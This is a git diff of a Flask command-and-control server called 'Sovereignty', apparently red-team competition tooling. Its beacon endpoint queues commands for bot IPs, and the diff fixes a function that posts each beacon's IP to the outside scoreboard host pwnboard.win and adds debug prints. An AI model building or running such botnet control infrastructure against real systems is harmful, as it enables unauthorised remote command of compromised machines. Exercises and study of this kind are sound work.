@@ -4,7 +4,7 @@ from flask_httpauth import HTTPBasicAuth
 from werkzeug.security import generate_password_hash, check_password_hash
 from collections import defaultdict
 from collections import defaultdict
-import os, json, time
+import os, json, time, requests
 import sqlalchemy as db
 
 
@@ -66,7 +66,7 @@ Description: page bot beacons to for get commands
 @app.route('/beacon')
 def beacon():
 	ip = request.args.get('ip')
-	updatePwnboard(ip)
+	print(updatePwnboard(ip))
 	if ip not in bots:
 		bots[ip] = []
 		botsExe[ip] = []
@@ -96,13 +96,15 @@ def confirm():
 	return 'True'
 
 def updatePwnboard(ip):
-    host = 'pwnboard.win'
+    host = 'http://pwnboard.win/generic'
     msg = "Sovereignty received a beacon"
     if not host:
         return
     data = {'ip': ip, 'application': "Sovereignty", 'message': msg}
+    print(data)
     try:
         req = requests.post(host, json=data, timeout=3)
+        print(req)
         return True
     except Exception as E:
         print("Cannot update pwnboard: {}".format(E))
